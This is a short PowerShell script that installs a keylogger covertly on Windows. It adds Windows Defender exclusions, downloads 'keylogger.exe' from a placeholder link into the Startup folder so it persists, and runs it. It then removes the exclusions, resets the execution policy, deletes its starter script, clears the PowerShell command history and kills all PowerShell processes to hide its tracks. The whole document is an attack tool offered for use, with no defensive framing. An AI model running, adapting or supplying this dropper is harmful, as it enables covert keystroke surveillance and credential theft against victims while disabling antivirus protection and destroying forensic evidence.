cd $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup #Go to the folder in which we will donwload files
Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
wget LINK -O keylogger.exe #Download keylogger script
Add-MpPreference -ExclusionPath $env:APPDATA\Microsoft\Windows\"Start Menu"\Programs\Startup\keylogger.exe -Force #Add exception for keylogger.exe file in antivirus
start keylogger.exe #Start keylogger script
Remove-MpPreference -ExclusionExtension exe -Force #Reser .exe files exception in antivirus
Remove-MpPreference -ExclusionExtension ps1 -Force #Reset .ps1 files exception in antivirus
Set-ExecutionPolicy restricted -Force #Reset script execution policy
del C:\Users\Public\Documents\startScript.ps1 #Delete startScript.ps1 file
Clear-Content (Get-PSReadlineOption).HistorySavePath #Clear all powershell commands history
taskkill -F /IM powershell.exe #Kill all powershell process
